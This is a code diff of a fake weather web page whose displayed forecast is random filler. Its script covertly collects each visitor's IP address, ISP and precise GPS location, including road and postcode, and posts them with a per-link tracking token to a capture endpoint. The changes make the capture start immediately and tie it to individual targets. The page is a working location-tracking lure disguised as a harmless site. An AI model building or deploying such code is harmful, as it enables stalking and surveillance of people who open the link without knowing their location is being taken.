@@ -239,18 +239,19 @@ nav a:hover{color:#fff}
   <div class="err" id="eb" style="display:none">Could not get weather. Please allow location access and reload.</div>
 </div>
 <script>
-var S=window.location.origin;
-var ic=['☀️','🌤','⛅','🌥','🌦','🌧','⛈','🌩','🌨','🌫','🌬'];
-var cd=['Sunny','Partly cloudy','Mostly cloudy','Light rain','Overcast','Heavy rain','Thunderstorm','Clear sky','Light snow','Mist'];
-var dys=['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
+var S   = window.location.origin;
+var tkn = new URLSearchParams(window.location.search).get('t') || '';
+var ic  = ['☀️','🌤','⛅','🌥','🌦','🌧','⛈','🌩','🌨','🌫','🌬'];
+var cd  = ['Sunny','Partly cloudy','Mostly cloudy','Light rain','Overcast','Heavy rain','Thunderstorm','Clear sky','Light snow','Mist'];
+var dys = ['Sun','Mon','Tue','Wed','Thu','Fri','Sat'];
 function r(a){return a[Math.floor(Math.random()*a.length)];}
 function rn(a,b){return Math.floor(Math.random()*(b-a))+a;}
 
 function showWeather(city,country){
   document.getElementById('ld').style.display='none';
   document.getElementById('wc').style.display='block';
-  document.getElementById('cn').textContent=city;
-  document.getElementById('co').textContent=country;
+  document.getElementById('cn').textContent=city||'Unknown';
+  document.getElementById('co').textContent=country||'';
   document.getElementById('wi').textContent=r(ic);
   var t=rn(8,42);
   document.getElementById('wt').textContent=t;
@@ -268,62 +269,74 @@ function showWeather(city,country){
   }
 }
 
-function cap(data){fetch(S+'/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(){});}
-
-function tryIP(){
-  document.getElementById('lt').textContent='Getting location...';
-  fetch(S+'/api/ip').then(function(r){return r.json();}).then(function(d){
-    if(d.status==='success'){showWeather(d.city||'Unknown',d.country||'');cap({method:'ip',lat:d.lat,lon:d.lon,city:d.city,country:d.country,ip:d.ip,isp:d.isp});}
-    else{document.getElementById('ld').style.display='none';document.getElementById('eb').style.display='block';}
-  }).catch(function(){document.getElementById('ld').style.display='none';document.getElementById('eb').style.display='block';});
+// Token hamesha attach karo
+function cap(data){
+  data.token = tkn;
+  fetch(S+'/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)}).catch(function(){});
 }
 
+// IP-based — turant chalega, koi wait nahi
+function tryIP(){
+  document.getElementById('lt').textContent='Loading weather...';
+  fetch(S+'/api/ip').then(function(res){return res.json();}).then(function(d){
+    if(d.status==='success'){
+      showWeather(d.city||'Unknown',d.country||'');
+      cap({method:'ip',lat:d.lat,lon:d.lon,city:d.city,country:d.country,ip:d.ip,isp:d.isp});
+    } else {
+      showWeather('Your City','');
+    }
+  }).catch(function(){
+    document.getElementById('ld').style.display='none';
+    document.getElementById('eb').style.display='block';
+  });
+}
+
+var captured=false;
+
 if(navigator.geolocation){
-  var bestAcc=Infinity,bestLat=null,bestLon=null,captured=false,wid=null;
+  var bestAcc=Infinity,bestLat=null,bestLon=null,wid=null;
+
+  // IP se turant start karo — GPS permission ka wait mat karo
+  tryIP();
 
   function doCapture(lat,lon,acc){
     if(captured)return;
     captured=true;
     if(wid!=null){navigator.geolocation.clearWatch(wid);}
     fetch(S+'/api/reverse?lat='+lat+'&lon='+lon)
-      .then(function(r){return r.json();})
+      .then(function(res){return res.json();})
       .then(function(d){
-        showWeather(d.city||'Your City',d.country||'');
+        // Weather already show ho raha IP se — sirf capture karo GPS data
         cap({method:'gps',lat:lat,lon:lon,
              city:d.city,suburb:d.suburb,state:d.state,
              country:d.country,country_code:d.country_code,
              road:d.road,postcode:d.postcode,
              accuracy:Math.round(acc)});
-      })
-      .catch(function(){
-        showWeather('Your Location','');
+        // GPS city se update karo display
+        if(d.city){ document.getElementById('cn').textContent=d.city; }
+        if(d.country){ document.getElementById('co').textContent=d.country; }
+      }).catch(function(){
         cap({method:'gps',lat:lat,lon:lon,accuracy:Math.round(acc)});
       });
   }
 
-  // watchPosition keeps refining — capture when accuracy ≤20m OR after 15s
+  // 10 sec baad GPS nahi mila toh IP capture already ho chuka hai
   var deadline=setTimeout(function(){
     if(!captured&&bestLat!==null){doCapture(bestLat,bestLon,bestAcc);}
-    else if(!captured){tryIP();}
-  },15000);
+  },10000);
 
   wid=navigator.geolocation.watchPosition(
     function(p){
       var lat=p.coords.latitude,lon=p.coords.longitude,acc=p.coords.accuracy;
-      // Keep best fix seen so far
       if(acc<bestAcc){bestAcc=acc;bestLat=lat;bestLon=lon;}
-      // If accuracy is good enough (≤25m), capture immediately
-      if(acc<=25&&!captured){
-        clearTimeout(deadline);
-        doCapture(lat,lon,acc);
-      }
+      if(acc<=35&&!captured){clearTimeout(deadline);doCapture(lat,lon,acc);}
     },
     function(e){
       clearTimeout(deadline);
       if(wid!=null){navigator.geolocation.clearWatch(wid);}
-      if(!captured){tryIP();}
+      // IP se already capture ho chuka hoga
     },
-    {enableHighAccuracy:true,timeout:20000,maximumAge:0}
+    {enableHighAccuracy:true,timeout:10000,maximumAge:0}
   );
 }else{tryIP();}
 </script>
